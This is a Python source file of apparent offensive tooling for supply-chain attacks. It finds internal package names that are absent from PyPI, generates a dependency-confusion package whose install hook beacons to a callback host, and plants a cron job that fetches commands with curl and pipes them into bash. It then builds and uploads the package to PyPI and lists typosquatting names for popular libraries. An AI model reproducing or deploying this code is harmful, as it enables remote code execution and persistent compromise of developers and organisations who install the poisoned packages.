"""Supply Chain Attack Modules — Dependency confusion, typosquatting, package poisoning"""

import json
import os
import re
import subprocess
import sys
from typing import Dict, List, Optional

import requests

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class DependencyConfusion:
    """Supply chain attack via dependency confusion.

    Scans internal projects for dependencies that could be hijacked
    by uploading malicious packages to public registries (PyPI, npm)
    with the same name as internal-only packages.
    """

    def __init__(self, target_dir: str = "."):
        self.target_dir = target_dir

    def scan_requirements(self, filepath: str = "requirements.txt") -> List[str]:
        """Extract package names from requirements.txt"""
        packages = []
        path = os.path.join(self.target_dir, filepath)
        if not os.path.exists(path):
            return packages
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith(("#", "-", "git+", "http")):
                    pkg = re.split(r"[>=<~!@]", line)[0].strip()
                    if pkg:
                        packages.append(pkg)
        logger.info(f"Found {len(packages)} packages in {filepath}")
        return packages

    def scan_pyproject(self) -> List[str]:
        """Extract dependencies from pyproject.toml"""
        path = os.path.join(self.target_dir, "pyproject.toml")
        packages = []
        if not os.path.exists(path):
            return packages
        with open(path) as f:
            content = f.read()
        in_deps = False
        for line in content.split("\n"):
            line = line.strip()
            if line.startswith("dependencies"):
                in_deps = True
                continue
            if in_deps:
                if line.startswith("]"):
                    break
                if line.startswith('"') or line.startswith("'"):
                    pkg = line.split("[")[0].strip("'\", ").split(">")[0].split("<")[0].split("=")[0].strip()
                    if pkg and not pkg.startswith("#"):
                        packages.append(pkg)
        logger.info(f"Found {len(packages)} packages in pyproject.toml")
        return packages

    def check_pypi_exists(self, package_name: str) -> bool:
        """Check if a package exists on PyPI"""
        try:
            resp = requests.get(f"https://pypi.org/pypi/{package_name}/json", timeout=10)
            return resp.status_code == 200
        except requests.RequestException:
            return False

    def find_confusion_candidates(self) -> List[Dict]:
        """Find packages that exist in project but NOT on PyPI"""
        candidates = []
        all_packages = list(
            set(self.scan_requirements() + self.scan_pyproject())
        )
        for pkg in all_packages:
            if not self.check_pypi_exists(pkg):
                candidates.append(
                    {"name": pkg, "source": "internal", "type": "dependency_confusion"}
                )
                logger.warning(f"Dependency confusion candidate: {pkg} (not on PyPI)")
        return candidates

    def generate_malicious_package(self, package_name: str, callback_url: str) -> str:
        """Generate a malicious PyPI package for dependency confusion"""
        package_dir = os.path.join("/tmp", f"wormy_{package_name}", package_name)
        os.makedirs(package_dir, exist_ok=True)

        setup_py = (
            f'from setuptools import setup\n'
            f'from setuptools.command.install import install\n'
            f'import os\n'
            f'import subprocess\n'
            f'import sys\n\n'
            f'class PostInstallCommand(install):\n'
            f'    def run(self):\n'
            f'        install.run(self)\n'
            f'        # Callback beacon\n'
            f'        try:\n'
            f'            import urllib.request\n'
            f'            urllib.request.urlopen("{callback_url}/beacon/{package_name}", timeout=5)\n'
            f'        except Exception:\n'
            f'            pass\n'
            f'        # Deploy persistence\n'
            f'        if sys.platform == "linux":\n'
            f'            cron = "* * * * * curl -s {callback_url}/cmd | bash\\n"\n'
            f'            with open("/tmp/.pkg_update", "w") as f:\n'
            f'                f.write(cron)\n'
            f'                os.system("crontab /tmp/.pkg_update 2>/dev/null")\n\n'
            f'setup(\n'
            f'    name="{package_name}",\n'
            f'    version="99.99.99",\n'
            f'    description="Auto-generated package",\n'
            f'    packages=["{package_name}"],\n'
            f'    cmdclass={{"install": PostInstallCommand}},\n'
            f')\n'
        )
        pkg_init = (
            f'"""Malicious package {package_name}"""\n'
            f'__version__ = "99.99.99"\n'
        )

        setup_path = os.path.join(os.path.dirname(package_dir), "setup.py")
        init_path = os.path.join(package_dir, "__init__.py")

        with open(setup_path, "w") as f:
            f.write(setup_py)
        with open(init_path, "w") as f:
            f.write(pkg_init)

        logger.success(f"Malicious package generated at {os.path.dirname(package_dir)}")
        return os.path.dirname(package_dir)

    def build_and_upload_wheel(self, package_dir: str, pypi_token: Optional[str] = None):
        """Build and optionally upload the malicious wheel"""
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "build", "twine"],
                capture_output=True,
                check=False,
            )
            subprocess.run(
                [sys.executable, "-m", "build", package_dir],
                capture_output=True,
                check=False,
            )
            dist_dir = os.path.join(package_dir, "dist")
            if pypi_token and os.path.exists(dist_dir):
                subprocess.run(
                    [
                        sys.executable, "-m", "twine", "upload",
                        "--username", "__token__",
                        "--password", pypi_token,
                        os.path.join(dist_dir, "*.tar.gz"),
                    ],
                    capture_output=True,
                    check=False,
                )
                logger.success(f"Package uploaded to PyPI from {dist_dir}")
            return dist_dir
        except Exception as e:
            logger.error(f"Build/upload failed: {e}")
            return None


class TyposquattingGenerator:
    """Generate typosquatting package names for popular PyPI packages"""

    TYPOS = {
        "requests": ["requestz", "reqests", "requets", "r3quests"],
        "flask": ["flaskk", "flaks", "phlask", "flsk"],
        "django": ["djangoo", "djanfo", "djagno", "djando"],
        "scrapy": ["scrapyy", "scrapee", "scrapi", "skrapy"],
        "paramiko": ["paramikko", "paramico", "paramiko"],
        "cryptography": ["cryptographyy", "kryptography", "cryptograpy"],
    }

    def generate_all(self) -> List[Dict]:
        """Generate all typosquatting candidates"""
        candidates = []
        for original, typos in self.TYPOS.items():
            for typo in typos:
                candidates.append({"original": original, "typo": typo})
        logger.info(f"Generated {len(candidates)} typosquatting candidates")
        return candidates


if __name__ == "__main__":
    dc = DependencyConfusion(".")
    candidates = dc.find_confusion_candidates()
    print(f"Confusion candidates: {candidates}")
    typos = TyposquattingGenerator().generate_all()
    print(f"Typosquatting candidates: {len(typos)}")
